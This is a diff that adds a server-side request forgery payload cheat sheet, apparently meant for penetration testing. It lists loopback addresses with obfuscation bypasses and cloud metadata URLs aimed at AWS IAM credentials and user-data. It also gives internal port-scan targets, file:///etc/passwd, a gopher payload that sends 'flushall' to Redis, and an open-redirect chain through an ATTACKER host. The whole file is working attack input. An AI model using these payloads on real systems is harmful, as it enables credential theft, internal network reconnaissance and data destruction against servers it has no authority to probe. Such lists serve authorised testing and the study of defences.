@@ -1,0 +1,80 @@
+# === SERVER-SIDE REQUEST FORGERY (SSRF) PAYLOADS ===
+# Test in: URL params (?url=, ?fetch=, ?src=, ?redirect=), webhook fields,
+#          import/export by URL, avatar URL, PDF/image generators, Referer header
+
+
+# --- Basic internal targets (confirm SSRF first) ---
+http://127.0.0.1/
+http://localhost/
+http://0.0.0.0/
+http://[::1]/
+
+
+# --- IP obfuscation bypasses ---
+http://0177.0.0.1/        # octal
+http://2130706433/         # decimal (127.0.0.1)
+http://0x7f000001/         # hex
+http://127.1/              # short form
+http://127.0.1/
+http://localhost.localdomain/
+http://localtest.me/       # resolves to 127.0.0.1
+
+
+# --- Cloud metadata (always try — huge impact) ---
+# AWS
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/user-data/
+
+# GCP (requires Metadata-Flavor: Google header — may work anyway)
+http://metadata.google.internal/computeMetadata/v1/
+http://169.254.169.254/computeMetadata/v1/
+
+# Azure
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+
+# DigitalOcean
+http://169.254.169.254/metadata/v1/
+
+
+# --- Internal port scanning (change port, look for response difference) ---
+http://127.0.0.1:22/
+http://127.0.0.1:80/
+http://127.0.0.1:443/
+http://127.0.0.1:8080/
+http://127.0.0.1:8443/
+http://127.0.0.1:3000/
+http://127.0.0.1:3306/     # MySQL
+http://127.0.0.1:5432/     # PostgreSQL
+http://127.0.0.1:6379/     # Redis
+http://127.0.0.1:27017/    # MongoDB
+http://127.0.0.1:9200/     # Elasticsearch
+http://127.0.0.1:5601/     # Kibana
+
+
+# --- Internal admin panels ---
+http://127.0.0.1/admin
+http://127.0.0.1:8080/manager/html    # Tomcat
+http://127.0.0.1:8500/                # Consul
+http://127.0.0.1:9200/_cat/indices    # Elasticsearch
+http://127.0.0.1:6379/                # Redis (will show banner)
+
+
+# --- Protocol confusion ---
+file:///etc/passwd
+file:///C:/Windows/win.ini
+dict://127.0.0.1:11211/stat           # Memcached
+gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a    # Redis RCE
+
+
+# --- Bypass: filter on "127.0.0.1" / "localhost" ---
+http://spoofed.burpcollaborator.net/   # resolves to 127.0.0.1
+http://0/
+http://[0:0:0:0:0:ffff:127.0.0.1]/
+http://①②⑦.⓪.⓪.①/
+
+
+# --- Bypass: open redirect chain ---
+# Host redirect: curl -s http://ATTACKER:8080/redir → returns 302 to http://169.254.169.254/
+# Then submit: http://ATTACKER:8080/redir
